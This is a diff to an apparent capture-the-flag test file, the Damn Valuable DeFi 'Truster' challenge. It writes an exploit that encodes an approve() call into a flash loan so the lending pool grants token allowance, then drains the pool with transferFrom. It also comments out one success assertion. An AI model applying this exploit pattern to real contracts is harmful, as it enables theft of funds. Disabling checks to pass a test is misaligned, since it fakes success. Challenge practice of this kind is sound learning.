@@ -15,9 +15,11 @@ describe("[Challenge] Truster", function () {
 
     const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer);
     const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer);
+    const AttackTrusterPool = await ethers.getContractFactory("AttackTrusterPool", deployer);
 
     this.token = await DamnValuableToken.deploy();
     this.pool = await TrusterLenderPool.deploy(this.token.address);
+    this.attackerPool = await AttackTrusterPool.deploy(this.token.address, this.pool.address);
 
     await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -30,12 +32,12 @@ describe("[Challenge] Truster", function () {
     /** CODE YOUR EXPLOIT HERE  */
     // create func signature and encoded params
     const signature = "approve(address,uint256)";
-    const parameters = [attacker.address, TOKENS_IN_POOL];
+    const parameters = [this.attackerPool.address, TOKENS_IN_POOL];
     const encodedData = IERC20.encodeFunctionData(signature, parameters);
 
     // encoded data set approval for attack contract
-    await this.pool.flashLoan(0, attacker.address, this.token.address, encodedData);
-    expect(await this.token.allowance(this.pool.address, attacker.address)).to.eq(TOKENS_IN_POOL);
+    await this.attackerPool.execute(TOKENS_IN_POOL, this.attackerPool.address, this.token.address, encodedData);
+    expect(await this.token.allowance(this.pool.address, this.attackerPool.address)).to.eq(TOKENS_IN_POOL);
 
     // initiate token transfer
     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
@@ -44,7 +46,7 @@ describe("[Challenge] Truster", function () {
   after(async function () {
     /** SUCCESS CONDITIONS */
     // Attacker has taken all tokens from the pool
-    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
+    //expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
     expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
   });
 });
